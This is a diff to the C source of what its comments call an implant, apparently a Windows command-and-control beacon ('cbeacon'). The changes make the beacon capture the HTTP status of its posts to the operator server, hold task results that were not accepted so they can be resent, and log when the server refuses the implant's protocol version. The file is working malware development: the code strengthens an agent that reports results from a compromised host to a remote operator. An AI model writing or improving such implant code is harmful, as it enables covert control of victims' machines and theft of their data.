@@ -191,6 +191,12 @@ static unsigned long long next_seq(void) {
 }
 static int g_registered = 0;
 
+/* Last HTTP status seen by http_post (0 = no response yet). The beacon loop
+ * reads it: the server answers 426 when it no longer serves this implant's
+ * protocol version, and that reason has to reach the operator instead of a
+ * silent retry loop. */
+static DWORD g_last_http_status = 0;
+
 /* ---------- tiny JSON helpers (responses only contain known shapes) ---------- */
 
 static const char *jskip(const char *p) {
@@ -334,6 +340,14 @@ static char *http_post(const char *body, DWORD bodylen, DWORD *outlen) {
         free(sendbuf);
         if (!sent) goto done;
         if (!WinHttpReceiveResponse(hReq, NULL)) goto done;
+        {
+            /* mingw's winhttp.h has no WinHttpQueryStatusCode; the status code
+             * is the same option value, read through WinHttpQueryOption. */
+            DWORD status = 0, status_len = sizeof(status);
+            if (WinHttpQueryOption(hReq, WINHTTP_QUERY_STATUS_CODE, &status, &status_len)) {
+                g_last_http_status = status;
+            }
+        }
         for (;;) {
             if (!WinHttpQueryDataAvailable(hReq, &avail)) goto done;
             if (avail == 0) break;
@@ -3766,6 +3780,29 @@ int main(void) {
         free(frame);
         dbglog("post-ret", "", 0);
         if (!resp) { do_sleep_interval(); continue; }
+        if (g_last_http_status != 0 && g_last_http_status != 200) {
+            /* The server refused the frame: the results were not accepted.
+             * Keep them for the next beacon (the server dedupes by result id)
+             * instead of dropping them, and report a protocol refusal once -
+             * otherwise the implant retries in silence and the operator only
+             * sees an agent that never comes online. */
+            if (g_last_http_status == 426) {
+                static int reported = 0;
+                if (!reported) {
+                    char reason[256];
+                    reason[0] = '\0';
+                    if (jstring(resp, "error", reason, sizeof(reason)) && reason[0]) {
+                        fprintf(stderr, "[cbeacon] beacon refused: %s\n", reason);
+                    } else {
+                        fprintf(stderr, "[cbeacon] beacon refused: the server does not serve this implant's protocol version\n");
+                    }
+                    reported = 1;
+                }
+            }
+            free(resp);
+            do_sleep_interval();
+            continue;
+        }
         /* Delivery confirmed (HTTP 200 with body): clear sent results.
          * On encrypt/post failure above we keep `results` for the next
          * loop (Go pendingResults parity) instead of dropping tasks to
